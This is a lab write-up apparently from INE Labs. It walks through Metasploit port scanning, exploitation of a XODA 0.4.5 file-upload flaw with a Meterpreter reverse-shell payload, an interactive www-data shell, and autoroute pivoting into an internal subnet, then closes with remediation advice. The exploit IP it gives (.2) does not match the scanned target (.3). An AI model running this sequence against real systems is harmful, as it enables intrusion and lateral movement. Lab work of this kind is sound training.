---
title: "T1046: Network Service Scanning"
description: "Discovering open ports with Metasploit, exploiting a XODA file-upload vulnerability for a foothold, and pivoting with autoroute to scan a second internal subnet."
date: 2025-10-22
platform: "INE Labs"
difficulty: "Medium"
tags: ["Metasploit", "Pivoting", "XODA", "MITRE ATT&CK", "Port Scanning"]
cover: "./photo1.png"
---

# T1046: Network Service Scanning

**Classification:** Assessment Methodologies / Enumeration<br>
**Targets:** 192.195.39.3 (first target - XODA web app) and the 192.130.188.0/24 internal subnet

## 1. Executive Summary

This lab follows the MITRE ATT&CK **T1046 (Network Service Scanning)** technique. We use
Metasploit auxiliary modules to discover open ports on the first target, exploit a **XODA
0.4.5** arbitrary file-upload vulnerability to obtain a Meterpreter foothold, and then use
that foothold to pivot (`autoroute`) into a second network subnet, where we scan for
further services.

![Lab objective - pivoting scenario](./photo1.png)

## 2. Port Scanning (First Target)

After preparing MSF Console (PostgreSQL, workspace), we search for port-scan modules and
use the TCP scanner.

```bash
search portscan
use auxiliary/scanner/portscan/tcp
show options
```

![Searching portscan modules](./photo2.png)

![portscan/tcp module options](./photo3.png)

```bash
set RHOSTS 192.195.39.3
```

![Setting the target RHOSTS](./photo4.png)

```bash
run
curl 192.195.39.3
```

Port 80 is open, and `curl` reveals a **XODA** web application.

![Port 80 open and XODA page via curl](./photo5.png)

## 3. Exploitation (XODA File Upload)

We search for a XODA module and find the arbitrary PHP file-upload exploit.

```bash
search xoda
use exploit/unix/webapp/xoda_file_upload
```

![Searching the XODA exploit module](./photo6.png)

```bash
set RHOSTS 192.195.39.2
show options
```

The exploit uses the `php/meterpreter/reverse_tcp` payload.

![xoda_file_upload module and payload options](./photo7.png)

```bash
set TARGETURI /
```

![Setting TARGETURI to the web root](./photo8.png)

```bash
exploit
```

The PHP payload is uploaded and executed, opening a Meterpreter session.

![Exploit success - Meterpreter session](./photo9.png)

## 4. Post-Exploitation

```bash
sysinfo
```

The compromised host is `demo1.ine.local` (php/linux).

![sysinfo output](./photo10.png)

We drop into a system shell as `www-data`.

```bash
shell
/bin/bash -i
export TERM=xterm
```

![Interactive shell as www-data](./photo11.png)

## 5. Discovering the Second Subnet

Checking the network interfaces reveals a second network: `eth1` on `192.130.188.2`
(192.130.188.0/24).

```bash
ifconfig
```

![ifconfig - second network interface](./photo12.png)

## 6. Pivoting

We add a route to the newly discovered subnet through the Meterpreter session and
background it, so further modules can reach the second target.

```bash
run autoroute -s 192.130.188.2
background
```

![autoroute - adding a route to the internal subnet](./photo13.png)

## 7. Scanning the Second Target

From here we can repeat the scanning phase against the new subnet. As an example we try a
UDP service sweep (in this case the target has no UDP services running).

```bash
search udp_sweep
use auxiliary/scanner/discovery/udp_sweep
show options
```

![udp_sweep module options](./photo14.png)

## 8. Remediation Recommendations

1. **Patch or replace XODA:** the 0.4.5 arbitrary file-upload flaw allows unauthenticated
   RCE; upgrade the application and validate/limit uploaded file types and locations.
2. **Run web apps with least privilege** so a `www-data` compromise cannot easily reach
   other hosts.
3. **Network segmentation:** isolate internal subnets and restrict routing between them to
   limit pivoting after a foothold.
4. **Egress filtering and monitoring:** block unexpected outbound connections (reverse
   shells) and alert on new internal routes or scanning behaviour.
